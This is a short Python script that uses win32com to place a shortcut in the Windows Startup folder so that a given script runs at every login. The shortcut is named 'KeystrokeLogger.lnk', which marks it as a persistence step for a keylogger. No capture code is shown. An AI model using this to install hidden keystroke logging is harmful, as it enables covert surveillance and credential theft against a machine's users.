import os
import sys
import shutil
import win32com.client
from pathlib import Path

# Path to the Python script you want to run at startup
script_path = "C:\\path\\to\\your_script.py"  # Change this to your actual script path

# Ensure the script path is valid
if not os.path.isfile(script_path):
    print(f"Error: The script {script_path} does not exist!")
    sys.exit(1)

# Create a shortcut to the script in the Startup folder
def create_shortcut():
    # Get the path to the current user's Startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

    # Define the shortcut path
    shortcut_path = os.path.join(startup_folder, 'KeystrokeLogger.lnk')

    # Create a shell object to create the shortcut
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(shortcut_path)

    # Set the properties for the shortcut
    shortcut.TargetPath = sys.executable  # Points to Python interpreter
    shortcut.Arguments = f'"{script_path}"'  # Pass the path of your script
    shortcut.WorkingDirectory = os.path.dirname(script_path)  # Set the working directory
    shortcut.IconLocation = sys.executable  # Optional: set the icon for the shortcut
    shortcut.Save()

    print(f"Shortcut created successfully at {shortcut_path}")

if __name__ == "__main__":
    # Create the shortcut to the startup folder
    create_shortcut()
